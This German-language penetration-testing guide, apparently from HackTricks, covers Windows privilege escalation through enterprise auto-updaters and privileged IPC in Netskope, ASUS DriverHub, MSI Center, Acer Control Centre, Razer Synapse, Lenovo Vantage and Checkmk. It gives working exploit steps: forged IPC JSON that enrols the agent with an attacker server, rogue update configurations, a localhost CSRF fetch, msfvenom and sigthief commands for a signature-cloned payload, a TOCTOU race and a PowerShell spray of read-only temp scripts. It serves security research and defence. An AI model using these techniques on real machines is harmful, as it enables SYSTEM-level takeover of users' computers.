# Missbrauch von Enterprise Auto-Updatern und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows-Local-Privilege-Escalation-Ketten, die bei Enterprise-Endpunkt-Agents und Updatern auftreten. Diese bieten eine leicht zugängliche IPC-Schnittstelle und einen privilegierten Update-Ablauf. Ein repräsentatives Beispiel ist Netskope Client für Windows < R129 (CVE-2025-0309), bei dem ein Benutzer mit niedrigen Berechtigungen die Registrierung bei einem vom Angreifer kontrollierten Server erzwingen und anschließend ein schädliches MSI ausliefern kann, das der SYSTEM-Dienst installiert.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Wichtige Ideen, die sich auf ähnliche Produkte übertragen lassen:
- Missbrauche das localhost-IPC eines privilegierten Dienstes, um eine erneute Registrierung oder Neukonfiguration auf einem Angreifer-Server zu erzwingen.
- Implementiere die Update-Endpunkte des Herstellers, liefere eine gefälschte Trusted Root CA aus und verweise den Updater auf ein schädliches, „signiertes“ Paket.
- Umgehe schwache Signer-Prüfungen (CN-Allow-Listen), optionale Digest-Flags und nachlässige MSI-Eigenschaften.
- Wenn das IPC „verschlüsselt“ ist, leite Schlüssel und IV aus maschinenbezogenen Kennungen ab, die weltweit lesbar in der Registry gespeichert sind.
- Wenn der Dienst Aufrufer anhand von Image-Pfad oder Prozessnamen einschränkt, injiziere Code in einen zugelassenen Prozess oder starte einen solchen im suspendierten Zustand und lade deine DLL über eine minimale Änderung des Thread-Kontexts.

Benutzerdefinierte lokale TCP-Dienste sollten derselben Prüfung ihrer Identität und Eingabegrenzen unterzogen werden, selbst wenn sie eine PIN oder andere Anwendungszugangsdaten erfordern. Ordne den Listener dem zugehörigen Prozess und dem effektiven Dienstkonto zu. Prüfe dann die genaue bereitgestellte Binärdatei und Version sowie, ob vom Aufrufer kontrollierte Felder vor dem Kopieren in feste Puffer oder vor ihrer Verwendung zum Erstellen eines untergeordneten Prozessbefehls auf ihre Länge geprüft werden. [Microsofts Anleitung zu Buffer Overruns](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) erläutert, warum ungeprüfte externe Eingaben in privilegiertem nativen Code gefährlich sind. Ein Loopback-Listener, ein fest codierter Zugangsschlüssel oder ein Prozessname allein belegen weder eine Speicherbeschädigung noch eine Ausführung als SYSTEM. Erreichbarkeit, Autorisierung, Codepfad und Mitigations bleiben voneinander unabhängige Bedingungen. Beschränke routinemäßige Enumeration auf passive Verfahren, statt einem aktiven Dienst Eingaben mit Crash-Länge zu senden.

---
## 1) Registrierung bei einem Angreifer-Server über localhost-IPC erzwingen

Viele Agents enthalten einen UI-Prozess im Benutzermodus, der über localhost-TCP und JSON mit einem SYSTEM-Dienst kommuniziert.

Bei Netskope beobachtet:
- UI: stAgentUI (niedrige Integrität) ↔ Dienst: stAgentSvc (SYSTEM)
- IPC-Befehls-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Erstelle ein JWT-Registrierungstoken, dessen Claims den Backend-Host steuern (z. B. AddonUrl). Verwende alg=None, sodass keine Signatur erforderlich ist.
2) Sende die IPC-Nachricht, die den Provisioning-Befehl mit deinem JWT und Mandantennamen aufruft:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Der Dienst beginnt, Anfragen für Enrollment/Config an deinen Rogue Server zu senden, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Überprüfung des Aufrufers pfad-/namensbasiert erfolgt, sende die Anfrage von einer allow-gelisteten Vendor-Binärdatei aus (siehe §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Über das Netzwerk erreichbare Management-IPC

Diese Vertrauensgrenze ist nicht immer auf localhost beschränkt. Im gemeldeten Fall MyReport Updater 2.1.1 lauschte ein `LocalSystem`-Dienst auf allen Schnittstellen und akzeptierte eine nicht authentifizierte gRPC-Konfigurationsänderung für den Referenzhost, den Port und den Betriebsmodus. Für die Remote-Variante waren sowohl Netzwerkzugriff auf den Listener als auch ausgehender Zugriff des Dienstes auf den ausgewählten Referenzhost erforderlich. Bewerte diese Punkte getrennt davon, ob der spätere Paketablauf die Grenze für Dateischreibvorgänge überschreiten kann.<sup>[[16]](#references)</sup>

---
## 2) Hijacking des Update-Kanals, um Code als SYSTEM auszuführen

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpunkte und leite ihn zu einer Angreifer-MSI. Typischer Ablauf:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen Updater-Intervall zurück, z. B.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Ein PEM-CA-Zertifikat zurückgeben. Der Dienst installiert es im Trusted-Root-Speicher des lokalen Computers.
3) /v2/checkupdate → Metadaten bereitstellen, die auf ein schädliches MSI und eine gefälschte Version verweisen.

Umgehung gängiger Prüfungen, die in freier Wildbahn zu finden sind:
- Signer-CN-Allow-List: Der Dienst prüft möglicherweise nur, ob der Subject-CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Deine Rogue CA kann ein Leaf-Zertifikat mit diesem CN ausstellen und das MSI signieren.
- CERT_DIGEST-Eigenschaft: Eine harmlose MSI-Eigenschaft namens CERT_DIGEST einfügen. Bei der Installation wird sie nicht überprüft.
- Optionale Digest-Prüfung: Ein Konfigurationsflag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert dein MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt damit beliebigen Code als NT AUTHORITY\SYSTEM aus.<sup>[[1]](#references)[[2]](#references)</sup>

Lehre aus dem Patch-Bypass: Wenn ein Anbieter darauf reagiert, indem er eine kleine Auswahl „vertrauenswürdiger“ Domains auf eine Allow-List setzt, statt die Update-Quelle kryptografisch zu authentifizieren, solltest du nach anbietereigenen Redirectors oder Reverse Proxies suchen, über die sich der Datenverkehr weiterhin steuern lässt. Im Fall von Netskope zeigte öffentliche Folgeforschung, dass sich eine Allow-List aus der R129-Ära weiterhin über `rproxy.goskope.com` ausnutzen ließ, das von Angreifern kontrollierte Azure App Service-Inhalte weiterleitete. Betrachte Hostname-Allow-Lists als Hürde, nicht als Vertrauensgrenze.<sup>[[14]](#references)</sup>

Ein weiterer Fehlerfall sind **in sich konsistente, aber nicht authentifizierte Paketmetadaten**. Im MyReport-Fall lieferte eine von Angreifern kontrollierte Referenz ein modifiziertes Archiv, während ein Intermediär die MD5-Digest- und Größenangaben des Anbieters änderte, bevor sie den Updater erreichten. Der Abgleich dieser Werte prüfte die Konsistenz der Antworten, nicht deren Herkunft vom Anbieter; eine MD5-Kollision war nicht erforderlich. Ein vom Aufrufer festgelegtes Installationsverzeichnis machte die privilegierte Extraktion dann zu einer Dateischreibgrenze. Das daraus entstehende DLL-Ladeprimitiv wird unter [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) behandelt.<sup>[[16]](#references)</sup>

---
## 3) Verschlüsselte IPC-Anfragen fälschen (falls vorhanden)

Ab R127 verpackte Netskope IPC-JSON in ein encryptData-Feld, das wie Base64 aussieht. Reverse Engineering ergab AES mit Schlüssel/IV, die aus für jeden Benutzer lesbaren Registry-Werten abgeleitet werden:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung nachbilden und gültige verschlüsselte Befehle von einem Standardbenutzer aus senden.<sup>[[1]](#references)[[2]](#references)</sup> Allgemeiner Tipp: Wenn ein Agent plötzlich seine IPC „verschlüsselt“, solltest du unter HKLM nach Geräte-IDs, Product-GUIDs und Installations-IDs suchen, die als Schlüsselmaterial dienen.

---
## 4) IPC-Aufrufer-Allow-Lists umgehen (Pfad-/Namensprüfungen)

Manche Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung ermitteln und den Image-Pfad/-Namen mit einer Allow-List von Anbieter-Binärdateien unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungsmöglichkeiten:
- DLL injection in einen Prozess auf der Allow-List (z. B. nsdiag.exe) und IPC-Proxying aus diesem Prozess heraus.
- Eine Binärdatei von der Allow-List angehalten starten und deine Proxy-DLL ohne CreateRemoteThread laden (siehe §5), um vom Treiber erzwungene Tamper-Regeln zu erfüllen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-Protection-freundliche Injection: angehaltener Prozess + NtContinue-Patch

Produkte enthalten häufig einen Minifilter-/OB-Callbacks-Treiber (z. B. Stadrv), der gefährliche Rechte aus Handles zu geschützten Prozessen entfernt:
- Prozess: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen berücksichtigt:
1) CreateProcess einer Anbieter-Binärdatei mit CREATE_SUSPENDED.
2) Die weiterhin erlaubten Handles abrufen: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Prozess sowie ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du den Code an einem bekannten RIP patchst).
3) ntdll!NtContinue (oder einen anderen früh ausgeführten, garantiert gemappten Thunk) mit einem kleinen Stub überschreiben, der LoadLibraryW für deinen DLL-Pfad aufruft und anschließend zurückspringt.
4) ResumeThread aufrufen, um den Stub im Prozess auszuführen und deine DLL zu laden.

Da du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME nie für einen bereits geschützten Prozess verwendet hast (du hast ihn selbst erstellt), erfüllt der Treiber die Richtlinie.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktische Tools
- NachoVPN (Netskope-Plugin) automatisiert eine Rogue CA, das Signieren eines schädlichen MSI und die Bereitstellung der benötigten Endpunkte: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erstellt und die Injection in angehaltene Prozesse enthält, um Nachrichten von einer Binärdatei auf der Allow-List auszusenden.<sup>[[4]](#references)</sup>

## 7) Schneller Triage-Workflow für unbekannte Updater-/IPC-Oberflächen

Bei einem neuen Endpoint-Agent oder einer „Helper“-Suite für Motherboards reicht oft ein schneller Workflow aus, um festzustellen, ob du ein vielversprechendes Privesc-Ziel vor dir hast:<sup>[[6]](#references)</sup>

1) Loopback-Listener auflisten und den Prozessen des Anbieters zuordnen:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Kandidaten für Named Pipes auflisten:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) In der Registry gespeicherte Routingdaten auslesen, die von pluginbasierten IPC-Servern verwendet werden:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrahiere zuerst Endpoint-Namen, JSON-Schlüssel und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Suche nach dem tatsächlichen Vertrauensprädikat, nicht nur nach dem Codepfad, der letztlich den Prozess startet:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Muster, die Vorrang haben sollten:
- `CryptQueryObject`/Zertifikatsanalyse ohne `WinVerifyTrust` bedeutet meist, dass „Zertifikat vorhanden“ als „Zertifikat vertrauenswürdig“ behandelt wurde. Das ermöglicht das Klonen von Zertifikaten oder andere Tricks mit gefälschten Signern.
- Teilstring-/Suffix-Prüfungen von `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` lässt sich meist mit vom Angreifer kontrollierten, ähnlich aussehenden Domains ausnutzen.
- Wenn die GUI mit niedrigen Rechten entscheidet, „die Datei ist vertrauenswürdig“, und der SYSTEM-Broker dieses Ergebnis lediglich übernimmt, lässt sich die Grenze oft vollständig umgehen, indem die clientseitige DLL/JS gepatcht oder neu implementiert wird (Validierungstrennung nach Razer-Art).
- Wenn der Broker eine Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und sie dann von diesem Pfad aus validiert oder einplant, teste sofort auf TOCTOU-Austauschfenster und auf benachbarte Plugin-Module, die alternative `ExecuteTask()`-Wrapper mit schwächeren Prüfungen bereitstellen.<sup>[[6]](#references)</sup>

Bei Zielen mit vielen Named Pipes ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und remote erreichbare Pipes zu finden, bevor du das Protokoll gründlich per Reverse Engineering analysierst.<sup>[[11]](#references)</sup>

Wenn das Ziel Aufrufer nur anhand der PID, des Image-Pfads oder des Prozessnamens authentifiziert, betrachte das eher als Hürde denn als Grenze: Oft genügt es, in den legitimen Client zu injizieren oder die Verbindung von einem Prozess auf der Allowlist herzustellen, um die Prüfungen des Servers zu bestehen. Speziell für Named Pipes behandelt [diese Seite zu Client-Impersonation und Pipe-Missbrauch](named-pipe-client-impersonation.md) die Primitive ausführlicher.

Untersuche bei einem privilegierten **Cleanup- oder Restore-Broker** neben der Pipe-ACL auch die Vertrauensgrenze für Pfade. Ein Aufrufer mit niedrigeren Rechten kann möglicherweise ein Restore-Ziel auswählen oder ein bereitgestelltes Backup-Artefakt in einem gemeinsam genutzten Verzeichnis umbenennen, selbst wenn die Service-Executable und ihr Installationsverzeichnis geschützt sind. Prüfe separat, ob der Aufrufer den Restore-Befehl ausführen kann, die exakte bereitgestellte Eingabe oder den Dateinamen ändern kann, der Broker mit einer höheren Identität läuft und der Restore-Vorgang tatsächlich in den ausgewählten geschützten Pfad schreibt. Ein beschreibbares Bereitstellungsverzeichnis oder eine lesbare Pipe allein belegt keinen beliebigen privilegierten Schreibzugriff; die Zielpfadzuordnung und das Verhalten des Services müssen durch Code-Review oder kontrollierte Tests überprüft werden. Führe bei passiver Aufklärung keinen unbekannten Cleanup-Befehl aus, da er Benutzerdateien löschen könnte.

---
## 8) Modulare Add-in-Broker, die nur anhand von Vendor-Signaturen authentifiziert werden (Lenovo-Vantage-Muster)

Eine neuere Variante, nach der es sich zu suchen lohnt, ist der **signierte Client-RPC-Broker**: Ein Lenovo-signierter Desktop-Prozess mit niedrigen Rechten kommuniziert mit einem SYSTEM-Service, und der Service leitet JSON-Befehle an eine Reihe XML-beschriebener Add-ins unter `%ProgramData%` weiter. Sobald Codeausführung **in einem beliebigen akzeptierten signierten Client** erreicht ist, gehört jeder Vertrag mit `runas="system"` zur Angriffsfläche.<sup>[[15]](#references)</sup>

Hochwertige Primitives aus der Lenovo-Vantage-Forschung:
- **Dem Aufrufer vertrauen, weil er vom Vendor signiert ist**: Forschende erreichten einen authentifizierten Kontext, indem sie eine Lenovo-signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL-Side-Load (`profapi.dll`) herbeiführten, sodass beliebiger Code innerhalb eines Clients ausgeführt wurde, dem der Service bereits vertraute.
- **Erkundung der Angriffsfläche anhand von Manifesten**: Add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere Verträge laufen als `SYSTEM`, sodass die Auflistung dieser Manifeste oft schneller als Reverse Engineering des Brokers selbst die tatsächlich privilegierten Verben offenbart.
- **Fehler einzelner Befehle hinter dem authentifizierten Kanal**: Nachdem Forschende in den vertrauenswürdigen Client gelangt waren, fand die öffentliche Forschung Path Traversal und Race Conditions in Update-/Installationsverben, Missbrauch von Raw SQL in privilegierten Einstellungsdatenbanken und teilstringbasierte Prüfungen von Registry-Pfaden, die Schreibzugriffe außerhalb des vorgesehenen Hives ermöglichten.

Nützliche Aufklärung auf einem Ziel:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktische Erkenntnis: Wenn eine Hilfsprogrammsuite einen Broker bereitstellt, der zuerst den **aufrufenden Prozess** authentifiziert und erst dann Dutzende Plugin-/Add-in-Befehle ausführt, solltest du nach dem Umgehen der vorgeschalteten Vertrauensprüfung nicht aufhören. Dump die Manifest-/Vertragstabelle und fuzz jeden Befehl mit hohen Berechtigungen separat; der authentifizierte Kanal verbirgt meist mehrere Fehler in nachgelagerten Verarbeitungsschritten.

---
## 1) CSRF vom Browser zu localhost gegen privilegierte HTTP-APIs (ASUS DriverHub)

DriverHub enthält einen HTTP-Dienst im User-Modus (ADU.exe) auf 127.0.0.1:53000, der Browser-Aufrufe von https://driverhub.asus.com erwartet. Der Origin-Filter führt für den Origin-Header und für Download-URLs, die über `/asus/v1.0/*` bereitgestellt werden, lediglich `string_contains(".asus.com")` aus. Daher besteht jeder vom Angreifer kontrollierte Host wie `https://driverhub.asus.com.attacker.tld` die Prüfung und kann über JavaScript zustandsändernde Anfragen senden.<sup>[[6]](#references)</sup> Weitere Umgehungsmuster findest du unter [CSRF-Grundlagen](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` enthält, und hoste dort eine bösartige Webseite.
2) Verwende `fetch` oder XHR, um einen privilegierten Endpunkt (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt das folgende Schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Sogar die unten gezeigte PowerShell-CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Jeder Browseraufruf der Angreifer-Website wird somit zu einem lokalen CSRF mit einem Klick (oder 0 Klicks über `onload`), der einen SYSTEM-Hilfsprozess steuert.

---
## 2) Unsichere Code-Signaturprüfung und Zertifikatsklonen (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige, im JSON-Body definierte ausführbare Dateien herunter und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Substring-Logik, sodass `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert wird. Nach dem Download prüft ADU.exe lediglich, ob die PE-Datei eine Signatur enthält und der Subject-String ASUS entspricht, bevor sie ausgeführt wird – ohne `WinVerifyTrust` und ohne Zertifikatskettenprüfung.

So lässt sich der Ablauf weaponisieren:
1) Erstelle ein Payload (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klone ASUS’ Signierer in die Datei (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Stelle `pwn.exe` auf einer ähnlich aussehenden `.asus.com`-Domain bereit und löse UpdateApp über den obigen Browser-CSRF aus.

Da sowohl die Origin- als auch die URL-Filter auf Substrings basieren und die Signaturprüfung nur Strings vergleicht, lädt DriverHub die Angreifer-Binärdatei herunter und führt sie im erhöhten Kontext aus.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in den Kopier-/Ausführungspfaden des Updaters (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Dienst von MSI Center stellt ein TCP-Protokoll bereit, bei dem jeder Frame aus `4-byte ComponentID || 8-byte CommandID || ASCII arguments` besteht. Die Kernkomponente (Component ID `0f 27 00 00`) enthält `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ihr Handler:
1) Kopiert die angegebene ausführbare Datei nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Prüft die Signatur über `CS_CommonAPI.EX_CA::Verify` (der Subject des Zertifikats muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` erfolgreich sein).
3) Erstellt eine geplante Aufgabe, die die temporäre Datei als SYSTEM mit angreifergesteuerten Argumenten ausführt.

Die kopierte Datei wird zwischen Überprüfung und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf eine legitime, von MSI signierte Binärdatei verweist (dadurch besteht die Signaturprüfung und die Aufgabe wird eingereiht).
- Gleichzeitig wiederholt Frame-B-Nachrichten senden, die auf ein schädliches Payload verweisen und `MSI Center SDK.exe` direkt nach Abschluss der Überprüfung überschreiben.

Wenn der Scheduler die Aufgabe startet, führt er das überschriebene Payload als SYSTEM aus, obwohl die ursprüngliche Datei geprüft wurde. Für eine zuverlässige Ausnutzung werden zwei Goroutines/Threads verwendet, die `CMD_AutoUpdateSDK` so lange wiederholt senden, bis das TOCTOU-Zeitfenster gewonnen wird.<sup>[[6]](#references)</sup>

---
## 2) Missbrauch benutzerdefinierter IPC auf SYSTEM-Ebene und Impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP-Befehlssätze
- Jedes von `MSI.CentralServer.exe` geladene Plugin/DLL erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, sodass Angreifer Befehle an beliebige Module weiterleiten können.
- Plugins können eigene Task-Runner definieren. `Support\API_Support.dll` stellt `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bereit und ruft `API_Support.EX_Task::ExecuteTask()` direkt **ohne Signaturprüfung** auf – jeder lokale Benutzer kann den Befehl auf `C:\Users\<user>\Desktop\payload.exe` richten und so zuverlässig SYSTEM-Ausführung erreichen.
- Das Mitschneiden von Loopback-Datenverkehr mit Wireshark oder die Instrumentierung der .NET-Binärdateien in dnSpy zeigt die Zuordnung von Component zu Befehl schnell auf; benutzerdefinierte Go-/Python-Clients können die Frames anschließend wiedergeben.<sup>[[6]](#references)</sup>

### Benannte Pipes von Acer Control Centre und Impersonation-Level
- `ACCSvc.exe` (SYSTEM) stellt `\\.\pipe\treadstone_service_LightMode` bereit. Die diskretionäre ACL erlaubt Remote-Clients den Zugriff (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Befehls-ID `7` mit einem Dateipfad ruft die Prozessstart-Routine des Dienstes auf.
- Die Client-Bibliothek serialisiert zusammen mit den Argumenten ein magisches Terminierungsbyte (113). Die dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungstipps) zeigt, dass der native Handler diesen Wert vor dem Aufruf von `CreateProcessAsUser` einer `SECURITY_IMPERSONATION_LEVEL` und einer Integrity-SID zuordnet.
- Wird 113 (`0x71`) durch 114 (`0x72`) ersetzt, landet die Ausführung im generischen Zweig, der das vollständige SYSTEM-Token beibehält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Die gestartete Binärdatei läuft daher uneingeschränkt als SYSTEM, sowohl lokal als auch rechnerübergreifend.
- In Kombination mit dem offengelegten Installer-Flag (`Setup.exe -nocheck`) lässt sich ACC auch auf Labor-VMs installieren und die Pipe ohne Hardware des Herstellers testen.<sup>[[6]](#references)</sup>

Diese IPC-Sicherheitslücken zeigen, warum Localhost-Dienste gegenseitige Authentifizierung erzwingen müssen (ALPC-SIDs, Filter für `ImpersonationLevel=Impersonation`, Token-Filterung) und warum der „beliebige Binärdatei ausführen“-Hilfsprozess jedes Moduls dieselben Signaturprüfungen verwenden muss.

---
## 3) COM/IPC-„Elevator“-Hilfsprozesse mit schwacher User-Mode-Validierung (Razer Synapse 4)

Razer Synapse 4 führte ein weiteres nützliches Muster dieser Familie ein: Ein Benutzer mit niedrigen Rechten kann einen COM-Hilfsprozess auffordern, über `RzUtility.Elevator` einen Prozess zu starten. Die Vertrauensentscheidung wird dabei an eine User-Mode-DLL (`simple_service.dll`) delegiert, statt robust innerhalb der privilegierten Sicherheitsgrenze durchgesetzt zu werden.

Beobachteter Ausnutzungspfad:
- Instanziiere das COM-Objekt `RzUtility.Elevator`.
- Rufe `LaunchProcessNoWait(<path>, "", 1)` auf, um einen Start mit erhöhten Rechten anzufordern.
- Im öffentlichen PoC wird die PE-Signaturprüfung in `simple_service.dll` vor der Anfrage entfernt, sodass eine beliebige, vom Angreifer gewählte ausführbare Datei gestartet werden kann.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-Aufrufsequenz:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Allgemeine Erkenntnis: Beim Reverse Engineering von „Helper“-Suiten sollte man sich nicht auf localhost-TCP oder Named Pipes beschränken. Prüfe auch, ob es COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` gibt, und verifiziere dann, ob der privilegierte Dienst die Ziel-Binärdatei selbst validiert oder lediglich einem Ergebnis vertraut, das eine patchbare User-Mode-Client-DLL berechnet hat. Dieses Muster findet sich nicht nur bei Razer: Jedes geteilte Design, bei dem der Broker mit hohen Berechtigungen eine Allow/Deny-Entscheidung von der Seite mit niedrigen Berechtigungen übernimmt, ist eine potenzielle privesc-Angriffsfläche.


---
## Ausführung vorhersagbarer temporärer Skripte während einer MSI-Reparatur (Checkmk Agent / CVE-2024-0670)

Manche Windows-Agents führen privilegierte Aktionen noch immer aus, indem sie eine temporäre `.cmd`-Datei in `C:\Windows\Temp` schreiben und als `SYSTEM` ausführen. Ist der Dateiname vorhersehbar und erstellt der Dienst vorhandene Dateien nicht sicher neu, kann ein Benutzer mit niedrigen Berechtigungen die künftige temporäre Datei vorab als **schreibgeschützt** erstellen. Dadurch führt der privilegierte Prozess vom Angreifer kontrollierten Inhalt statt seines eigenen Skripts aus.

Beobachtet in verwundbaren Checkmk-Agent-Builds:
- temp-Muster: `cmk_all_<PID>_1.cmd`
- betroffene Zweige: `2.0.0`, `2.1.0`, `2.2.0`
- Auslöser: MSI-**Reparatur** des zwischengespeicherten Agent-Pakets<sup>[[8]](#references)[[9]](#references)</sup>

Praktischer Ablauf:
1. Schätze einen realistischen PID-Bereich anhand aktueller Prozess-IDs oder der PID des laufenden Agents.
2. Schreibe eine kurze `.cmd`-Payload in **ASCII** (`Set-Content -Encoding Ascii` oder Umleitung über `cmd.exe`; vermeide die UTF-16-Ausgabe von PowerShell für Batch-Dateien).
3. Spraye `C:\Windows\Temp\cmk_all_<PID>_1.cmd` über den möglichen Bereich und markiere jede Datei als schreibgeschützt.
4. Löse eine Reparatur des zwischengespeicherten MSI aus, damit der privilegierte Dienst versucht, das temporäre Skript neu zu erstellen, und es anschließend ausführt.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Wenn das anfällige Produkt mit Windows Installer installiert wurde, ordnen Sie die zufällig wirkende zwischengespeicherte MSI-Datei unter `C:\Windows\Installer` vor dem Auslösen der Reparatur dem Produktnamen zu:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Betriebshinweise:
- `qwinsta` ist hilfreich, wenn `msiexec /fa` in einer nicht-interaktiven WinRM-Shell fehlschlägt und Sie herausfinden müssen, ob eine bestehende Desktop-/getrennte Sitzung die Reparatur korrekt auslösen kann.<sup>[[7]](#references)</sup>
